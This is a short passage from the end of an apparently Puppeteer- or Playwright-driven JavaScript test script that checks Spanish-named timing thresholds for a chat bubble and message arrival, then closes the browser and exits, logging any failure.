  r.F_ok = a1.enA !== null && a1.enA <= 1.5 && r.F_burbuja_extra_s !== null && r.F_burbuja_extra_s <= 1.0 && r.F_llegada_extra_s !== null && r.F_llegada_extra_s <= 3.0;
  fin();
  await browser.close();
  process.exit(0);
})().catch((e) => { console.error('FALLO:', e.stack); fin({ error: String(e && e.message).slice(0, 200) }); process.exit(1); });
